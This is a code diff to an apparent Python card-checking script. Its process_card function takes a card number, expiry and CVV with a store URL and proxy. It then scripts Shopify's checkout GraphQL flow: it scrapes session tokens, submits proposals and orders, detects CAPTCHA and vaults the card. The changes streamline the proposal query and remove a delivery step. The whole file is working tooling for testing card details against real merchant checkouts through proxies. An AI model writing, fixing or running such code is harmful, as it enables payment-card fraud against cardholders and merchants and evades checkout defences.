@@ -13,15 +13,17 @@ import os
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
 logger = logging.getLogger(__name__)
 
-QUERY_PROPOSAL_SHIPPING = """query Proposal($sessionInput:SessionTokenInput!,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$queueToken:String,$checkpointData:String,$note:NoteInput,$tip:TipTermInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput,$alternativePaymentCurrency:AlternativePaymentCurrencyInput,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$transformerFingerprintV2:String){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{runningTotal{value{amount currencyCode __typename}__typename}total{value{amount currencyCode __typename}__typename}delivery{__typename ...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle amount{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}}payment{__typename}tax{__typename ...on FilledTaxTerms{totalTaxAmount{value{amount currencyCode __typename}__typename}__typename}}__typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}}__typename}}"""
+# Minimal query — only fields guaranteed to be non-union.
+QUERY_PROPOSAL = """query Proposal($sessionInput:SessionTokenInput!,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$queueToken:String,$checkpointData:String,$note:NoteInput,$tip:TipTermInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput,$alternativePaymentCurrency:AlternativePaymentCurrencyInput,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$transformerFingerprintV2:String){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{__typename ...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{__typename total{value{amount currencyCode __typename}__typename}__typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}}errors{code localizedMessage nonLocalizedMessage __typename}}__typename}}"""
 
-QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL_SHIPPING
+QUERY_PROPOSAL_SHIPPING = QUERY_PROPOSAL
+QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL
 
 MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){__typename ...on SubmitSuccess{receipt{id __typename}__typename}...on SubmitAlreadyAccepted{receipt{id __typename}__typename}...on SubmittedForCompletion{receipt{id __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage nonLocalizedMessage __typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}__typename}}"""
 
 QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{__typename ...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}__typename}__typename}__typename}}"""
 
-logger.info(f"QUERY_PROPOSAL_SHIPPING: {len(QUERY_PROPOSAL_SHIPPING)} chars")
+logger.info(f"QUERY_PROPOSAL: {len(QUERY_PROPOSAL)} chars")
 logger.info(f"MUTATION_SUBMIT: {len(MUTATION_SUBMIT)} chars")
 logger.info(f"QUERY_POLL: {len(QUERY_POLL)} chars")
 
@@ -223,7 +225,6 @@ def extract_session_token(response_obj, text, unescaped, checkout_url):
         r'data-session-token=["\']([^"\']{20,})["\']',
         r'data-checkout-session-token=["\']([^"\']{20,})["\']',
         r'"checkoutToken"\s*:\s*"([^"]{20,})"',
-        r'window\.__checkout\s*=\s*\{[^}]*"sessionToken"\s*:\s*"([^"]{20,})"',
     ]
     for src in (text, unescaped):
         for pat in token_patterns:
@@ -232,10 +233,6 @@ def extract_session_token(response_obj, text, unescaped, checkout_url):
                 tok = m.group(1).strip()
                 if len(tok) >= 20 and not re.fullmatch(r'[0-9a-f]{40}', tok):
                     return tok
-    m = re.search(r'<meta\s+name=["\']shopify-checkout-session-token["\'][^>]*content=["\']([^"\']+)["\']',
-                  unescaped, re.IGNORECASE)
-    if m:
-        return m.group(1).strip()
     m = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9_\-]{20,})', checkout_url)
     if m:
         candidate = m.group(1)
@@ -255,7 +252,7 @@ def safe_parse_json(text, label=""):
         return None, f"Invalid JSON ({label}): {e}"
 
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
-    gateway = "UNKNOWN"
+    gateway = "Shopify Payments"
     total_price = "0.00"
     currency = "USD"
     ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
@@ -423,7 +420,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'noDeliveryRequired': [], 'useProgressiveRates': False,
                     'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True
                 },
-                'deliveryExpectations': {'deliveryExpectationLines': []},
                 'merchandise': {'merchandiseLines': [{
                     'stableId': stableId,
                     'merchandise': {'productVariantReference': {
@@ -455,15 +451,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                       'shippingScriptChanges': []},
                 'optionalDuties': {'buyerRefusesDuties': False}
             }
-            json_data = {'query': QUERY_PROPOSAL_SHIPPING, 'operationName': 'Proposal',
-                         'variables': proposal_vars}
+            json_data = {'query': QUERY_PROPOSAL, 'operationName': 'Proposal', 'variables': proposal_vars}
             response, resp_text = await make_graphql_request(session, graphql_url, params, headers, json_data, proxy)
             await asyncio.sleep(2)
             if not resp_text:
-                return False, "Empty GraphQL response (shipping)", gateway, total_price, currency
+                return False, "Empty GraphQL response", gateway, total_price, currency
             if is_captcha_required(resp_text):
                 return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
-            resp_json, parse_err = safe_parse_json(resp_text, "shipping")
+            resp_json, parse_err = safe_parse_json(resp_text, "proposal")
             if parse_err:
                 return False, parse_err, gateway, total_price, currency
             if resp_json.get('errors'):
@@ -490,28 +485,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             seller_proposal = result.get('sellerProposal')
             if not isinstance(seller_proposal, dict):
                 return False, "Seller proposal is null", gateway, total_price, currency
-            running_total_data = seller_proposal.get('runningTotal')
-            if isinstance(running_total_data, dict):
-                running_total = safe_get(running_total_data, 'value', 'amount', default="0.00")
+            total_data = seller_proposal.get('total')
+            if isinstance(total_data, dict):
+                running_total = safe_get(total_data, 'value', 'amount', default=subtotal)
             else:
-                total_data = seller_proposal.get('total')
-                running_total = safe_get(total_data, 'value', 'amount', default="0.01") if isinstance(total_data, dict) else "0.01"
-            delivery_data = seller_proposal.get('delivery')
-            delivery_strategy = ''
+                running_total = subtotal
             shipping_amount = 0.0
-            if isinstance(delivery_data, dict) and delivery_data.get('__typename') == 'FilledDeliveryTerms':
-                dl = delivery_data.get('deliveryLines') or []
-                if dl and isinstance(dl[0], dict):
-                    avail = dl[0].get('availableDeliveryStrategies') or []
-                    if avail and isinstance(avail[0], dict):
-                        delivery_strategy = avail[0].get('handle', '')
-                        shipping_amount = float(safe_get(avail[0], 'amount', 'value', 'amount', default="0") or 0)
             tax_amount = 0.0
-            tax_data = seller_proposal.get('tax')
-            if isinstance(tax_data, dict) and tax_data.get('__typename') == 'FilledTaxTerms':
-                tax_amount = float(safe_get(tax_data, 'totalTaxAmount', 'value', 'amount', default="0") or 0)
+            delivery_strategy = ''
             payment_identifier = "shopify_payments"
-            gateway = "Shopify Payments"
             total_price = str(round(float(running_total) + shipping_amount + tax_amount, 2))
             dl0 = json_data['variables']['delivery']['deliveryLines'][0]
             dl0['selectedDeliveryStrategy'] = {
@@ -528,10 +510,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'zoneCode': state, 'phone': phone}}
             json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
             json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
-            json_data['query'] = QUERY_PROPOSAL_DELIVERY
-            response, resp_text2 = await make_graphql_request(session, graphql_url, params, headers, json_data, proxy)
-            if is_captcha_required(resp_text2 or ""):
-                return False, "CAPTCHA_REQUIRED (delivery)", gateway, total_price, currency
             vault_payload = {
                 "credit_card": {
                     "number": cc, "month": int(mes), "year": int(ano),
